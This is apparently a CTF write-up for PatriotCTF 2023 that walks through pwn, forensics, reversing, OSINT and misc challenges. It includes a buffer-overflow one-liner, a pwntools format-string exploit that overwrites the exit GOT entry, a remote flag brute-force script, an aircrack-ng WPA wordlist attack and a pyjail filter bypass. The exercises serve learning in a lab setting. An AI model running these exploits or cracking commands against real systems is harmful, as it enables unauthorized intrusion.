All original files can be found here : https://github.com/MasonCompetitiveCyber/PatriotCTF2023

# PWN

## Guessinggame 

When dealing with pwn challenges, a good start is to check the security of the binary. We can do this by using the `checksec` command in gdb. But here, the challenge is marked as beginner so I directly looked at the source code (Variables has been renamed for simplicity)

[Source code](/Images/guessinggame.png)

We see that if printFlag is different from 0, the flag will be printed. However it's set to 0. Luckily for us, the program has a buffer overflow vulnerability (the length of the input is not checked). We can exploit this by overflowing the buffer and overwriting the value of printFlag to 1.
To do so, I generated a long string using python and piped it to the program.

```bash
python -c "print('A'*400)" | ./guessinggame
```

This gives the flag !

## Printshop

We're once again given an ELF file. The source code is the following : 

[Source Code](/Images/printshop.png)

The vulnerability here lies in the fact the the format of the input is not checked, meaning that we can print out value from the stack : 

[Vulnerability](/Images/printshop2.png)

Next, we can use the magic of pwntools and use the function fmtstr_payload. We know that the next function to be executed is exit so we can overwrite its GOT address with this of the win function :

```python
from pwn import *

elf = ELF("./printshop")
context.binary = elf

p = remote("chal.pctf.competitivecyber.club", 7997)

p.recvrepeat(1)
p.sendline(fmtstr_payload(6, {elf.got["exit"] : elf.symbols["win"]}))

p.interactive()
```

# Forensics

## Unsupported Format

We're given a corrupted image. We I deal with forensics picture, I always put them on aperisolve (https://aperisolve.com). We can notice that binwalk found some file in the image. By downloading the input, we found the original image and the flag ! 

## Capybara

We're once again given a picture. Let's do the same as for the previous challenge. This time, binwalk find an audio file. When we listen to it, one can recognize morse. I used this website to decode it (https://morsecode.world/international/decoder/audio-decoder-adaptive.html). This gives an hexadecimal which can be decoded to give the flag !

## Congratulations

This challenges gives us a word document. When opening it, we are prompted with a message telling us that macros have been disabled for safety issue. Word documents are in fact archives. These can be opened with winrar. In the word folder, I found a file called vbaProject.bin. This could contain the macro. I justed opened it with an hex editor and found this :

[Macro](/Images/Conratulations.png)

By decoding these hex value, we find the flag

## Unsupported Format 2

We receive once again a corrupted image. Once again, let's use aperisolve. Binwalk find a picture. When I opened the picture, I found that the size was too big for such a bad quality image. When we scrolled to the bottom, We see that the pattern CORRUPTED is repeated. I noticed that the first CORRUPTED was begun with "PK" which is the header of a zip file ! I so removed the the beginning of the file (everything until PK), then used find and replace option of cyberchef. This gives the zip file we expected ! In it, we find an image. As usual, I used aperisolve and the flag was in a layer of the image.

[Receipe](/Images/Corrupted2.png)

## Evil Monkey 1

We're given a blend file. This is a file used by blender. I opened it with blender and was prompted with a message telling me that automatique execution of python script was blocked. I so looked at the script and found this python code : 

[Script](/Images/Monkey1.png)

To find the key, I run strings command on the file and scrolled down. I found the key : Th3_Ev1l_M0nkey!

## Read The EULA

We're given a packet capture file. By looking at some packets, I found some items used in the game. I just googled the name of the item and noticed it was used in the game Minitest. I them looked for a wireshark plugin to parse the traffic correctly. I found this one : https://github.com/minetest/minetest/blob/master/util/wireshark/minetest.lua

Now, let's reopen the file with wireshark. The challenge descriptions tells us that the flag is hidden in the movement of the player. To get only packets related to player position, i use the following filter : 

```bash
minetest.client.playerpos_x
``` 

Then I dumped the packets in a file. I then used this python script to get the movement of the player : 

```python
import re

pattern = r'"minetest\.client\.playerpos_x": "(\d+)",'
pattern_y = r'"minetest\.client\.playerpos_y": "(\d+)",' #y doesn't change so not used
pattern_z = r'"minetest\.client\.playerpos_z": "(\d+)",'

# Ouvrez le fichier en mode lecture
with open('test.json', 'r') as fichier:
    lignes = fichier.readlines()

x = []
z = []
# Parcourez chaque ligne du fichier
for ligne in lignes:
    match = re.search(pattern, ligne)
    if match:
        valeur_de_la_position = match.group(1)
        x.append(int(valeur_de_la_position)- 157998)#the - 157998 is just to center around 0
for ligne in lignes:
    match = re.search(pattern_z, ligne)
    if match:
        valeur_de_la_position = match.group(1)
        z.append(int(valeur_de_la_position)- 233078)
print(z)
```
Having the position of the player, I used matlab to print the flag : 

[Plot](/Images/EULA.png)

## Evil Monkey 2

We're asked to find the endpoint of the shellcode used in the previous challenge. To do so, I first decoded the shellcode and saved it into a .bin file. I then uploaded the shell on virustotal. When we look at the Relations tab, we see it communicates with a file called Monkey.exe (https://www.virustotal.com/gui/file/bbd2ea5450451d4a5613a3578d3574aff8e087b85797fbcc79993518b86bf330)

Looking at the behavior tab, we see the follwing text : 

```
{"Type": "Metasploit Connect", "IP": "13.37.13.37", "Port": 1738}
```

# OSINT

## Bad Documentation

According to the description, we are looking for a deleted file. By looking at the commit on github, we notice some file has been deleted.  We can anyway access the deleted picture : 

[Picture](/Images/Documentation.png)

By decoding this based64 strings, we find the flag ! 

# Rev

## Coffee Shop

Simply open the file in Jadx and decrypt the 3 base64 strings 

[Code](/Images/CoffeeShop.png)

## Python XOR

We're given this python script : 

```python

from string import punctuation

alphabet = list(punctuation)
data = "bHEC_T]PLKJ{MW{AdW]Y"
def main():
#   For loop goes here
    key = ('')
    decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data])
    print(decrypted)
main()
```

According the challenge description, the key is a key from the alphabet. We than so easily bruteforce it :

```python
from string import punctuation

alphabet = list(punctuation)
data = "bHEC_T]PLKJ{MW{AdW]Y"
for char in alphabet:
    key = char
    decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data])
    print(decrypted)
```
## Patchwork

We're given an elf file. Looking at the description, we're probably going to patch the binary. I opened it in ghidra and luckily, my ghidra is configured to show unreachable code. You can do it like this : 

[Patchwork](/Images/Patchwork.png)

Then, we see this appearing in the main function :

```c
undefined8 main(void)

{
  puts("Trampolines are quite fun!; I love to jump! ");
  puts("You should try jumping too! It\'ll sure be more fun than reversing the flag manually.");
  if (false) {
    give_flag();
  }
  return 0;
}
```

We can see that the function give_flag is never called. We can patch the binary to call it. I justed patched the binary to change the jz instruction to a jnz instruction and then run the binary

```asm
        0010116a 75  0a           JNZ        LAB_00101176
```

## Suboptimal

We're given an elf file. By looking at the source code, we see some operation are done to the intput and then a check with the encrypted flag is done. The operation uses modulo so it's pretty complicated to reverse. The approach I used is to patch the binary so that it doesn't exit directly on the complex function (I nopped the print and the exit). I then runned the binary on gdb and break on the check to see how my input was transformed. 

[GDB](/Images/Suboptimal.png)

I inputted 23 "a" (as the input should be 23 char long). As you can see, these "a" became "i". These "i" are going to be compared with the flag xk|nF{quxzwkgzgwx|quitH. I assumed that, as the operation was linear, substracting the encrypted flag from my input would give me the difference I should add to each "a" character. I didn't scripted it but it took me 10 minutes to do it for each character. 
For example, here's what I did to find the first chars :

[Char](/Images/suboptimal2.png)

## Python Garbage Compiler

I was first tricked by the brainfuck code but by interpreting it, I noticed it was only the same as the python code. Then, we can see that all operation done to the input are linear so I wrote a script to reverse them : 

```python
import random
import string

def reverse_finalstage(output):
    reversed_chars = []
    half_len = len(output) // 2
    for i in range(half_len):
        reversed_chars.append(output[i * 2 + 1])
        reversed_chars.append(output[i * 2])

    if len(output) % 2 == 1:
        reversed_chars.append(output[-1])

    reversed_string = ''.join(reversed_chars)
    original_input = reversed_string[::-1]

    return original_input

def reverse_stage2(output):
    random.seed(10)  
    original_input = ''
    for char in output:
        original_ascii = ord(char) + random.randint(0, 5)
        original_input += chr(original_ascii)

    return original_input

def reverse_stage1(output):
    original_input = ''
    for i, char in enumerate(output):
        original_ascii = ord(char) ^ i
        original_input += chr(original_ascii)

    return original_input

def reverse_entry(output):
    original_input = output[::-1]
    return original_input


output = r'^seqVVh+]>z(jE=%oK![b$\NSu86-8fXd0>dy'
original_input = reverse_entry(reverse_stage1(reverse_stage2(reverse_finalstage(output))))
print(original_input)  
```

# Misc

## Uh-Oh

Use this regex on vscode : 

```bash
\(\d{3}\) \d{3}-\d{4}
```

## WPA

using aircrack-ng : 

aircrack-ng -a2 -b 52:e2:4d:0a:a6:36 -w /usr/share/wordlists/rockyou.txt savedcap.cap

The BSSID can be find by looking at the beacon frame (the first one)

## Twins

Use that website to find the difference between both files : https://www.diffchecker.com/

## Flag finder

When playing a bit, we can notice that the flag should be 19 characters longs. Then, we know that it should begin by pctf. When inputting this and then some random garbage to match 19 characters, we see that the server tells us when we find a good character. I thus wrote this script to bruteforce the flag. This use the fact that each time you find a char, the output from the servers is 2 lines longer : 

```python	
from pwn import *
import string

context.log_level = 'ERROR'

flag = "pctf{Ti"
flag_length = 19
amount_of_terms = 15#amounf of lines outputted by the server
guess = string.ascii_lowercase + string.digits + string.punctuation + string.ascii_uppercase

actual_char = 0

while len(flag) < 19:
	p = remote("chal.pctf.competitivecyber.club", 4757)
	p.recvuntil(b"What is the password:")
	input = flag + guess[actual_char]*(flag_length-len(flag))
	p.sendline(input)
	output = p.recvuntil(b"There's been an error")
	output = str(output).split("\\n")
	if len(output) > amount_of_terms:
		print("Found next char !")
		flag = flag + guess[actual_char]
		print(flag)
		actual_char = 0
		amount_of_terms += 2
	else:
		actual_char +=1
	p.close()
```

## ML Pyjail

I played a bit with the server and noticed than when you input an accepted command and then a not accepted one, the server accepted it, so I justed concated an accepted command with a not accepted one to cat the flag 
